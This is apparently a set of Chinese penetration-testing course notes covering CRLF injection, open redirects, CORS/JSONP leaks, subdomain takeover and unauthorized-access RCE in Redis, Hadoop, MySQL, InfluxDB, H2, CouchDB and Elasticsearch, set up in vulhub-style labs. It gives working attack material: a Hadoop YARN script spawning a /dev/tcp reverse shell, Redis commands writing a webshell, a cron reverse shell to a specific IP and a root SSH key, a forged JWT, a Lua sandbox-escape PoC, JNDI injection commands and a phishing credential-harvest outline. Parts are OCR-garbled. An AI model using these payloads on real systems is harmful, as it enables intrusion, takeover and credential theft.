<p>字段或报文主体，并在响应中输出，所以又称为 HTTP 响应拆分漏洞。</p>
<p>如何检测安全问题：CRLFuzz</p>
<h6 id="2-URL-重定向跳转"><a href="#2-URL-重定向跳转" class="headerlink" title="2.URL 重定向跳转"></a>2.URL 重定向跳转</h6><p>写代码时没有考虑过任意 URL 跳转漏洞，或者根本不知道&#x2F;不认为这是个漏洞;</p>
<p>写代码时考虑不周,用取子串、取后缀等方法简单判断，代码逻辑可被绕过;</p>
<p>对传入参数做一些奇葩的操作(域名剪切&#x2F;拼接&#x2F;重组)和判断，适得其反，反被绕过; </p>
<p>原始语言自带的解析 URL、判断域名的函数库出现逻辑漏洞或者意外特性,可被绕过;</p>
<p>原始语言、服务器&#x2F;容器特性、浏览器等对标准 URL 协议解析处理等差异性导致绕过;</p>
<h6 id="3-Web-拒绝服务"><a href="#3-Web-拒绝服务" class="headerlink" title="3.Web 拒绝服务"></a>3.Web 拒绝服务</h6><p>现在有许多资源是由服务器生成然后返回给客户端的，而此类“资源生成”接口如若有参数</p>
<p>可以被客户端控制（可控），并没有做任何资源生成大小限制，这样就会造成拒绝服务风</p>
<p>险，导致服务器处理不过来或占用资源去处理。</p>
<h4 id="演示案例：-30"><a href="#演示案例：-30" class="headerlink" title="演示案例："></a>演示案例：</h4><p>CRLF注入-原理&amp;检测&amp;利用<br>URL重定向-原理&amp;检&amp;利用<br>WEB拒绝服务-原理&amp;检测&amp;利用</p>
<h4 id="案例1-CRLF注入原理-检测-利用"><a href="#案例1-CRLF注入原理-检测-利用" class="headerlink" title="#案例1-CRLF注入原理&amp;检测&amp;利用"></a>#案例1-CRLF注入原理&amp;检测&amp;利用</h4><p>vulhub nginx</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%0aSet-cookie:JSPSESSID%3Ddrops</span><br><span class="line">url=%0d%0a%0d%0a&lt;img src=1 onerror=alert(/xss/)&gt;/</span><br><span class="line">CRLFuzz:https:.//github.com/dwisiswanto/crlfuzz/releases</span><br></pre></td></tr></table></figure>

<p>设置cookie值</p>
<p>配合xss弹窗.</p>
<h4 id="案例2-URL重定向-原理-检测-利用"><a href="#案例2-URL重定向-原理-检测-利用" class="headerlink" title="#案例2-URL重定向&amp;原理&amp;检测&amp;利用"></a>#案例2-URL重定向&amp;原理&amp;检测&amp;利用</h4><p><a target="_blank" rel="noopener" href="http://xxx/zb_system/login.php?url=http://www.xiaodi8.com/zb_system/login.php">http://xxx/zb_system/login.php?url=http://www.xiaodi8.com/zb_system/login.php</a><br>大概意思是讲重定向漏洞的危害：网站接受用户输入的链接，跳转到一个攻击者控制的网<br>站，可能得致跳转过去的用户被精心设置的钓鱼贡面骗走自己的个人信层和登录口令。国<br>外大厂的一个任意URL跳转都500S、1000S了，国内看运气~<br>业务：<br>用户登录、统一身份分认证处，认证完后跳转<br>用户分孚、收意内容过后，会跳转<br>跨站点认证、授权后，会跳转<br>站内点击其它网址链接时，会跳转</p>
<p>钓鱼思路：找到含有url重定向漏洞的网站–保存到本地–修改本地html为php文件然后写入两个接收用户名和密码的变量，把变量传给网站同目录下x.php–x.php用来接收变量用户名和密码–受害者访问伪造好的链接输入用户名密码–密码传给x.php–写入本地user.txt</p>
<h4 id="案例3-WEB拒绝服务-原理-检测-利用"><a href="#案例3-WEB拒绝服务-原理-检测-利用" class="headerlink" title="案例3-WEB拒绝服务-原理&amp;检测&amp;利用"></a>案例3-WEB拒绝服务-原理&amp;检测&amp;利用</h4><p>1、验证码或图片显示自定义大小<br>2、上传压缩包解压循环资源占用</p>
<h1 id="第54天-WEB攻防-通用漏洞-跨域CORS资源-JSONP回调-域名接管劫持"><a href="#第54天-WEB攻防-通用漏洞-跨域CORS资源-JSONP回调-域名接管劫持" class="headerlink" title="第54天 WEB攻防-通用漏洞&amp;跨域CORS资源&amp;JSONP回调&amp;域名接管劫持"></a>第54天 WEB攻防-通用漏洞&amp;跨域CORS资源&amp;JSONP回调&amp;域名接管劫持</h1><h4 id="知识点：-34"><a href="#知识点：-34" class="headerlink" title="知识点："></a>知识点：</h4><p>1、子域名接管检测&amp;探针&amp;利用<br>2、C0SP跨域资源检测&amp;探针&amp;利用<br>3、JSONP跨域回调-检侧&amp;探针&amp;利用</p>
<h4 id="前置知识点："><a href="#前置知识点：" class="headerlink" title="#前置知识点："></a>#前置知识点：</h4><p>同源策路(SOP),“同源”包括三个条件：同协议同域名同端口<br>同源策路限制从一个源加载的文档或脚本与来自另一个源的资源进行交互，这是一个用于隔<br>离潜在恶意文件的关键的安全机制简单说就是浏览器的一种安全策略。<br>虽然同源策路在安全方面起到了很好的防护作用，但也在一定程度上限制了一些前端功能的<br>实现，所以就有了许多跨域的手段。</p>
<p>子域名接管：<br>域名解析记录指向域名，对应主机指向了一个当前未在使用或已经删除的特定服务，攻击<br>者通过注册指向域名，从而控制当前域名的控制权，实现恶意软件分发、网络钓鱼&#x2F;鱼叉式<br>网络钓鱼、XSS、身份验证绕过等。子域名接管不仅仅限于CNAME记录，NS,MX甚至A<br>记录也会受到影响。<br>检测项目：<br><a target="_blank" rel="noopener" href="https://github.com/pwnesia/dnstake">https://github.com/pwnesia/dnstake</a><br><a target="_blank" rel="noopener" href="https://github.com/anshumanbh/tko-subs">https://github.com/anshumanbh/tko-subs</a><br><a target="_blank" rel="noopener" href="https://github.com/mhmdiaa/second-order">https://github.com/mhmdiaa/second-order</a><br><a target="_blank" rel="noopener" href="https://github.com/r3curs1v3-proxy/sub404">https://github.com/r3curs1v3-proxy/sub404</a></p>
<h4 id="COSP跨域资源（为了解决非同域名资源调用的问题）"><a href="#COSP跨域资源（为了解决非同域名资源调用的问题）" class="headerlink" title="COSP跨域资源（为了解决非同域名资源调用的问题）"></a>COSP跨域资源（为了解决非同域名资源调用的问题）</h4><p>CORS全称Cross-Origin Resource Sharing,跨域资源共享，是HTML5的一个新特性，已被<br>所有浏刘览器支持，跨域资原共享(C0RS)是一种放宽同源策路的机制，它允许浏览器向跨源<br>服务器，发出XMLHttpRequesti请求，从而克服了AJAX只能同源使用的限制，以使不同的<br>网站可以跨域获取数据。<br>Access-Control-.Allow-Origin:指定鄂些域可以访问域资源。伤例如，如果requester.com想<br>要访问provider…com的资源，那么开发人员可以使用此标头安全地授子requester…com对<br>provider…com资源的访问权限<br>Access-Control–Allow-Credentials:指定浏览器是否将使用请求发送cookie。仅当alow-<br>credentials标头设置为true时，才会发送Cookie.<br>Access-Control-.Allow-Methods:指定可以使用那些HTTP请求方法（GET,PUT,<br>DELETE等）来访问资源。此标头允许开发人员通过在requester.com情求访问<br>provider.com的资源时，指定哪些方法有效来进一步增强安全性。<br>检测项目：<a target="_blank" rel="noopener" href="https://github.com/chenjj/CORScanner">https://github.com/chenjj/CORScanner</a></p>
<h4 id="JSONP跨域回调"><a href="#JSONP跨域回调" class="headerlink" title="JSONP跨域回调"></a><strong>JSONP跨域回调</strong></h4><p>JSONP跨域巧妙的利用了scriptt标签能跨域的特点，实现了json的跨域传输。<br>检测项目：手工审查元素筛选或Burp项目<br><a target="_blank" rel="noopener" href="https://github.com/p1g3/JSONP-Hunter">https://github.com/p1g3/JSONP-Hunter</a></p>
<h4 id="演示案例：-31"><a href="#演示案例：-31" class="headerlink" title="演示案例："></a>演示案例：</h4><p>CORS资源跨域敏感页面源码获取<br>JSONP回调跨域-某牙个人信息泄露<br>子域名接管瓜迪个人子域名劫持接管<br>检测项目-CORS&amp;JSONP&amp;子域名接管</p>
<p><strong>CORS和CSRF攻击的区别</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">CORS  资源共享</span><br><span class="line">用户A在登录自己的后台或什么页面，这个时候访问了第三方的页面</span><br><span class="line">第三方页面去请求这个后台或页面的内容，用户A访问的页面即将页面的内容泄露了</span><br><span class="line">只做 资源的获取</span><br><span class="line"></span><br><span class="line">CSRF 同源策略就失败</span><br><span class="line">黑客可以去操作后台</span><br><span class="line">操作添加用户，修改密码等</span><br></pre></td></tr></table></figure>

<h4 id="CORS资源跨域致感页面源码获取"><a href="#CORS资源跨域致感页面源码获取" class="headerlink" title="#CORS资源跨域致感页面源码获取"></a>#CORS资源跨域致感页面源码获取</h4><p>复现步骤：<br>1、本地塔建访问页面跨域调用URL<br>2、受害者访问当前页面被资源共享<br>思路：受害者登录后台界面–访问恶意构造的链接–致使后台资源发送到攻击者vps</p>
<p>上述代码为请求<a target="_blank" rel="noopener" href="http://localhost/Zblog/zb_system/admin/index.php%E8%BF%99%E4%B8%AA%E5%9C%B0%E5%9D%80%EF%BC%8C%E7%84%B6%E5%90%8E%E5%9B%A0%E4%B8%BA%E8%BF%99%E6%98%AF%E7%BD%91%E7%AB%99%E5%90%8E%E5%8F%B0%E6%98%AF%E7%99%BB%E5%BD%95%E7%8A%B6%E6%80%81%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E8%AE%BF%E9%97%AE%EF%BC%8C%E9%82%A3%E4%B9%88%E5%B0%B1%E4%BC%9A%E6%8A%8A%E9%87%8C%E9%9D%A2%E7%9A%84%E5%86%85%E5%AE%B9%E4%BB%A5%E5%8F%98%E9%87%8Fz0%E5%8F%91%E5%88%B0http://localhost:80/cors1.php%E3%80%82%E7%84%B6%E5%90%8Ecors1.php%E5%B0%B1%E4%BC%9A%E6%8E%A5%E6%94%B6%E5%8F%98%E9%87%8F%E5%8F%91%E9%80%81%E7%9A%84%E8%AF%B7%E6%B1%82%E5%B9%B6%E4%BF%9D%E5%AD%98%E5%88%B0%E6%9C%AC%E5%9C%B0%E3%80%82">http://localhost/Zblog/zb_system/admin/index.php这个地址，然后因为这是网站后台是登录状态可以直接访问，那么就会把里面的内容以变量z0发到http://localhost:80/cors1.php。然后cors1.php就会接收变量发送的请求并保存到本地。</a><br>整个攻击的流程和csrf非常的相似，但是大多数网站目前都开启的同源策略会导致CSRF失效，而通过资源跨域可以实现敏感信息泄露。</p>
<p>在白盒代码审计的情况下就是看设置问题了，就是看origin设置的是不是*，是星号，那么就有这个漏洞。而黑盒就是看origin设置后能通过资源。上面说过这个origin这个值在请求头中，那我们是不是可以抓包修改。</p>
<p>参考链接：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/204023.html">https://www.freebuf.com/articles/web/204023.html</a></p>
<p>#JSONP回调跨域某牙个人信息泄露<br>复现步骤：<br>1、登录某牙找到回调有敏感信息<br>2、本地搭建访问页面跨域调用URL<br>3、访问本地页面可获取当前某牙信息<br>当用户点击这个html之后就会被攻击者得到回调<br>而这个和csrf的区别就是一般大型网站都会检测同源策略，所以你只能用这个回调去获取一些信息。而找这个漏洞就是看你能不能找到这个回调，回调里面有没有敏感信息。如果有那么这里就有安全问题。可以直接在数据包那里搜callback来查看回调</p>
<p>#子域名接管瓜迪个人子域名劫持接管<br>复现步骤：Xia0di8com<br>1、通过检测cname获取指向<br>2、发现testxiaodi fun过期受控<br>3、注册testxiaodi fun:实现控制</p>
<p>#检测项目-CORS&amp;JSONP&amp;子域名接管<br>1.python cors_scan.py-i top_100_domains.tx-t 100<br>2、人工排查+burpsuite安装Jsonp_Hunter py抓包使用<br>3、dnsub爬取子域名筛选接管</p>
<h1 id="第55天-服务攻防-数据库安全-Redis-Hadoop-Mysqla-未授权访问-RCE"><a href="#第55天-服务攻防-数据库安全-Redis-Hadoop-Mysqla-未授权访问-RCE" class="headerlink" title="第55天 服务攻防-数据库安全&amp;Redis&amp;Hadoop&amp;Mysqla&amp;未授权访问&amp;RCE"></a>第55天 服务攻防-数据库安全&amp;Redis&amp;Hadoop&amp;Mysqla&amp;未授权访问&amp;RCE</h1><h4 id="知识点：-35"><a href="#知识点：-35" class="headerlink" title="知识点："></a>知识点：</h4><p>1、服务攻防数据库类型安全<br>2、Redis&amp;Hadoop&amp;Mysql安全<br>3、Mysql-CVE-2012-2122漏洞<br>4、Hadoop-配置不当未授权三重奏&amp;RCE漏洞<br>3、Redis-配置不当未授权三重奏&amp;RCE两漏洞</p>
<h4 id="章节内容：-1"><a href="#章节内容：-1" class="headerlink" title="#章节内容："></a>#章节内容：</h4><p>常见服务应用的安全测试：<br>1、配置不当-未授权访问<br>2、安全机制特定安全漏洞<br>3、安全机制弱口令爆破攻击</p>
<h4 id="前置知识：-4"><a href="#前置知识：-4" class="headerlink" title="#前置知识："></a>#前置知识：</h4><p>应用服务安全测试流程：见图<br>组合猜测（由于nat会导致端口扫描不到真实端口信息）、信息来源（报错、特征）<br>1、判断服务开放情况-端口扫描&amp;组合应用等<br>2、判断服务类型归属数据库&amp;文件传翰&amp;通讯等<br>3、判断服务利用方式特定漏洞&amp;未授权&amp;弱口令等演示案例：</p>
<p>Mysql-未授权访问-CVE-2012-2122利用<br>Hadoop-.未授权访问-内置配合命令执行RCE<br>Redis-未授权访问-Webshell&amp;任务&amp;密匙&amp;RCE等</p>
<p><strong>Mysql-未授权访问-CVE-2012-2122利用</strong><br>复现环境：vulhub      出现的可能性不大</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for i in `seq 1 1000`; do mysql -uroot -pwrong -h you-ip -P3306 ; done </span><br></pre></td></tr></table></figure>

<p>漏洞复现：</p>
<p>1、vulhub开启漏洞环境</p>
<p>2、攻击机：kali扫描目标端口并验证</p>
<p><strong>Hadoop-未授权访问-内置配合命令执行RCE</strong><br>复现环境：vulfocus<br>思路：访问特定</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">target = <span class="string">&#x27;http://127.0.0.1:8088/&#x27;</span></span><br><span class="line">lhost = <span class="string">&#x27;192.168.0.1&#x27;</span> <span class="comment"># put your local host ip here, and listen at port 9999</span></span><br><span class="line"></span><br><span class="line">url = target + <span class="string">&#x27;ws/v1/cluster/apps/new-application&#x27;</span></span><br><span class="line">resp = requests.post(url)</span><br><span class="line">app_id = resp.json()[<span class="string">&#x27;application-id&#x27;</span>]</span><br><span class="line">url = target + <span class="string">&#x27;ws/v1/cluster/apps&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;application-id&#x27;</span>: app_id,</span><br><span class="line">    <span class="string">&#x27;application-name&#x27;</span>: <span class="string">&#x27;get-shell&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;am-container-spec&#x27;</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;commands&#x27;</span>: &#123;</span><br><span class="line">            <span class="string">&#x27;command&#x27;</span>: <span class="string">&#x27;/bin/bash -i &gt;&amp; /dev/tcp/%s/9999 0&gt;&amp;1&#x27;</span> % lhost,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">&#x27;application-type&#x27;</span>: <span class="string">&#x27;YARN&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line">requests.post(url, json=data)</span><br></pre></td></tr></table></figure>

<p>漏洞复现：<br>1、vulhub搭建hadoop漏洞环境</p>
<p>2、攻击机kali开启nc监听端口，使用exp攻击反弹shell</p>
<p>#Redis-未授权访问-Webshell&amp;任务&amp;密匙&amp;RCE等<br>1、写Webshell需得到Web路径<br>利用条件：Web目录权限可读写</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">config set dir /tmp</span><br><span class="line">#设置WEB写入目录</span><br><span class="line">config set dbfilename1.php设置写入文件名</span><br><span class="line">set test&quot;c?php phpinfo):?&gt;&quot;#设置写入文件代码</span><br><span class="line">bgsave</span><br><span class="line">#保存执行</span><br><span class="line">save</span><br><span class="line">#保存执行</span><br></pre></td></tr></table></figure>

<p>注意：部分没目录权限读写权限</p>
<p>2、写定时任务反单shell<br>利用条件：<br>允许异地登录<br>安全模式protected-mode处于关闭状态</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/spool/cron</span><br><span class="line">set yy “ninin*****bash-&gt;&amp;/dev/tcp/47.94.236.117/55550&gt;&amp;1nnn”</span><br><span class="line">config set dbfilename x</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p>注意：<br>centos会忽略乱码去执行格式正确的任务计划<br>而ubuntu并不会忽略这些乱L码，所以导致命令执行失败</p>
<p>3、写入Linux ssh-key公钥<br>利用条件：<br>允许异地登录<br>Redis服务使用ROOT账号启动<br>安全模式protected-mode处于关闭状态<br>允许使用密钥登录，即可远程写入一个公钥，直接登录远程服务器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen-t rsa</span><br><span class="line">cd /root/.ssh/</span><br><span class="line">(echo -e “nin”;cat id_rsa.pub;echo-e&quot;nin&quot;)&gt;key.txt</span><br><span class="line">cat key.txt redis-cli-h 118.31.57.214 -x set xxx</span><br><span class="line">config set dir /root/.ssh/</span><br><span class="line">config set dbfilename authorized keys</span><br><span class="line">save</span><br><span class="line">cd /root/.ssh/</span><br><span class="line">ssh -i id rsa root@118.31.57.214</span><br></pre></td></tr></table></figure>

<p>4、RCE自动化利用脚本-vulfocus<br><a target="_blank" rel="noopener" href="https://github.com/vulhub/redis-rogue-getshell">https://github.com/vulhub/redis-rogue-getshell</a><br>python redis-.master…py-f123.58.236.76-p9830-L47.94.236.117-P8888-f<br>RedisModulesSDK&#x2F;exp.so -c “id”</p>
<p>5.新漏洞-沙箱绕过RCE CVE-2022-0543-vulfocus<br>Poc:执行id命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eval &#x27;local io_I package.loadlib(“/usr/lib/x86_64-linux-gnu/liblua5.1.so.0”,“luaopen_io”);</span><br><span class="line">local io io_I（）;local f=io.popen(“id”,“r”);local res f.read(“a”);f:close（）;return res’o</span><br></pre></td></tr></table></figure>

<p>参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40882763/article/details/129742604?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-2-129742604-blog-130589818.235%5Ev40%5Epc_relevant_3m_sort_dl_base1&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-2-129742604-blog-130589818.235%5Ev40%5Epc_relevant_3m_sort_dl_base1&utm_relevant_index=5">https://blog.csdn.net/qq_40882763/article/details/129742604?spm=1001.2101.3001.6650.2&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-2-129742604-blog-130589818.235%5Ev40%5Epc_relevant_3m_sort_dl_base1&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-2-129742604-blog-130589818.235%5Ev40%5Epc_relevant_3m_sort_dl_base1&amp;utm_relevant_index=5</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">附加：其实日常中最常见的就是redis和mysql这两种数据库最好常见，特别是redis未授权访问，在内网渗透中就很重要，ssrf+redis内网渗透就很有名，而且通过redis的未授权访问可以达到上传shell的作用。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">注意：redis搭建时候千万不要无密码或者弱密码，不然就很容易中病毒</span><br><span class="line">参考：https://juejin.cn/post/7195199519624003642   会导致服务器基本就是没用了</span><br></pre></td></tr></table></figure>

<h1 id="第56天-服务攻防-数据库安全-H2-Elasticsearch-CouchDB-Influxdb复现"><a href="#第56天-服务攻防-数据库安全-H2-Elasticsearch-CouchDB-Influxdb复现" class="headerlink" title="第56天 服务攻防-数据库安全&amp;H2&amp;Elasticsearch&amp;CouchDB&amp;Influxdb复现"></a>第56天 服务攻防-数据库安全&amp;H2&amp;Elasticsearch&amp;CouchDB&amp;Influxdb复现</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">前言：这一小节中的数据库现在使用已经很少了，主要就是要知道还有这些数据库的存在。</span><br></pre></td></tr></table></figure>

<h4 id="知识点：-36"><a href="#知识点：-36" class="headerlink" title="知识点："></a>知识点：</h4><p>1、服务攻防数据库类型安全<br>2、influxdb,.未授权访问wt验证<br>3、H2 database-未授权访问-配置不当<br>4、CouchDB-权限绕过配合RCE-漏洞<br>5、ElasticSearch-文件写入&amp;RCE-漏洞</p>
<h4 id="章节内容：-2"><a href="#章节内容：-2" class="headerlink" title="#章节内容："></a>#章节内容：</h4><p>常见服务应用的安全测试：<br>1、配置不当-未授权访问<br>2、安全机制特定安全漏洞<br>3、安全机制弱口令爆破攻击</p>
<h4 id="前置知识：-5"><a href="#前置知识：-5" class="headerlink" title="#前置知识："></a>#前置知识：</h4><p>应用服务安全测试流程：见图<br>1、判断服务开放情况端口扫描&amp;组合应用等<br>2、判折服务类型归属数据库&amp;文件传输&amp;通讯等<br>3、判折服务利用方式特定漏洞&amp;未授权&amp;弱口令等</p>
<h4 id="演示案例：-32"><a href="#演示案例：-32" class="headerlink" title="演示案例："></a>演示案例：</h4><p>Influxdb-未授权访问-Jwt验证不当<br>H2database-未授权访问-配置不当<br>CouchDB-权限绕过配合RCE-漏洞<br>ElasticSearch-文件写入&amp;RCE-漏洞</p>
<h4 id="nfluxdb-未授权访问-Jwt验证不当"><a href="#nfluxdb-未授权访问-Jwt验证不当" class="headerlink" title="#nfluxdb-未授权访问-Jwt验证不当"></a>#nfluxdb-未授权访问-Jwt验证不当</h4><p>默认端☐：8086,8088<br>influxdb是一款菩名的时序数据库，其使用jwt作为鉴权方式。在用户开启了认证，但未设<br>置参数shared-secret的情况下，jwt的认证密钥为空字符串，此时攻击者可以伪造任意用户<br>身份在influxdb中执行SQL语句，<br>1、使用 <a target="_blank" rel="noopener" href="https://jwt.io/">https://jwt.io/</a> 生成一个带有空密钥的有效 JWT 令牌：      ——-JWT也是CTF比赛中常考知识点。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">alg&quot;:&quot;HS256&quot;,</span><br><span class="line">&quot;typ&quot;:&quot;JWT&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#123;</span><br><span class="line">&quot;usemame&quot;:&quot;admin&quot;,</span><br><span class="line">&quot;exp&quot;:1676346267</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中是管理员帐户名称，是令牌过期时间。您应该设置为将来的时间以使其生效：username exp exp</p>
<p>然后把这个令牌带到请求中，并成功在服务器中执行SQL语句：show users</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/query</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>your-ip</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoyOTg2MzQ2MjY3fQ.LJDvEy5zvSEpA_C6pnK3JJFkUKGq9eEi8T2wdum3R_s</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>22</span><br><span class="line"></span><br><span class="line"><span class="language-ini"><span class="attr">db</span>=sample&amp;q=show+users</span></span><br><span class="line"><span class="language-ini"></span></span><br></pre></td></tr></table></figure>

<h4 id="H2-database-未授权访问-配置不当"><a href="#H2-database-未授权访问-配置不当" class="headerlink" title="#H2 database-未授权访问-配置不当"></a>#H2 database-未授权访问-配置不当</h4><p>默认端口：20051<br>H2 database是一款Java内存数据库，多用于单元测试。H2 database自带一个Web管理页<br>面，在Spring开发中，如果我们设置如下选项，即可允许外部用户访问Wb管理页面，且<br>没有鉴权：默认端口：<br>spring.h2.console.enabled&#x3D;true<br>spring.h2.console.settings.web-allow-others&#x3D;true<br>利用这个管理页面，我们可以进行JND注入攻击，进而在目标环境下执行任意命令。<br>管理页面默认为。<a target="_blank" rel="noopener" href="http://your-ip:8080/">http://your-ip:8080</a>  <a target="_blank" rel="noopener" href="http://your-ip:8080/h2-console/">http://your-ip:8080/h2-console/</a><br>1、下载JNDI-Injection-Exploit<br><a target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Exploit">https://github.com/welk1n/JNDI-Injection-Exploit</a><br>2、生成执行RMI Payload-URL<br>-C执行命令-A服务器地址<br>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar-C touch &#x2F;tmp&#x2F;success -A 47.94.236.117</p>
<p>在攻击机运行poc，执行后攻击机会监听8180、1099、1389端口</p>
<p>javax.naming.InitialContext是 JNDI 工厂类名，URL 是恶意的 RMI 地址。rmi:&#x2F;&#x2F;evil:23456&#x2F;BypassByEL<br>攻击机的 RMI 服务器收到以下请求：</p>
<p>touch &#x2F;tmp&#x2F;success已成功执行：</p>
<h4 id="CouchDB-权限绕过RCE-CVE-2017-12636"><a href="#CouchDB-权限绕过RCE-CVE-2017-12636" class="headerlink" title="#CouchDB-权限绕过RCE-CVE-2017-12636"></a>#CouchDB-权限绕过RCE-CVE-2017-12636</h4><p>1、下载exp.py<br>2、修改目标和反弹地址<br>3、Python3调用执行即可<br><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2017-12636/exp.py">https://github.com/vulhub/vulhub/blob/master/couchdb/CVE-2017-12636/exp.py</a></p>
<h4 id="ElasticSearch-文件写入-RCE漏洞"><a href="#ElasticSearch-文件写入-RCE漏洞" class="headerlink" title="#ElasticSearch-文件写入&amp;RCE漏洞"></a>#ElasticSearch-文件写入&amp;RCE漏洞</h4><p>默认端口：92009300<br>Elasticsearch RCE CVE-2014-3120<br>1、漏洞需要s中至少存在一条数据，所以我们需要先创建一条数据</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST /website/blog/HTTP/1.1</span><br><span class="line">Host:your-ip:9200</span><br><span class="line">Accept:*/</span><br><span class="line">Accept-Language:en</span><br><span class="line">User-Agent:Mozilla/5.0 (compatible;MSIE 9.0:Windows NT 6.1;Win64:x64:Trident/5.0)</span><br><span class="line">Connection:close</span><br><span class="line">Content-Type:application/x-www-form-urlencoded</span><br><span class="line">Content-Length:25</span><br><span class="line">&#123;</span><br><span class="line">&quot;name&quot;:&quot;xiaodi&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2、直接发包触发执行命令</p>
<p>Elasticsearch文件写入wooyun2015110216<br>9200一股为ElasticSearch的常用端口，此漏洞环境需要与中间件使用<br>1、发现9200端口存在elasti-search页面，8080存在tomcat目录<br>2、利用ElasticSearch写入后门到&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps&#x2F;wwwroot&#x2F;</p>
